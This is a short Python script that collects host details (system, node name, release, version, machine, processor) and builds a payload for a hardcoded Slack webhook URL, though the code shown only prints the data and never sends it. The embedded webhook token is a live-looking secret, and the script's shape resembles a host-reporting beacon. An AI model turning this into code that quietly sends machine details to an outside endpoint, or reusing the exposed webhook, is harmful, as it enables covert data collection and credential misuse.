import platform
import requests
import json
import time
import re

WEBHOOK = 'https://hooks.slack.com/services/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'

my_system = platform.uname()
info = ''
info += f"System: {my_system.system}\n"
info += f"Node Name: {my_system.node}\n"
info += f"Release: {my_system.release}\n"
info += f"Version: {my_system.version}\n"
info += f"Machine: {my_system.machine}\n"
info += f"Processor: {my_system.processor}"
payload = {"text": info}
print(info)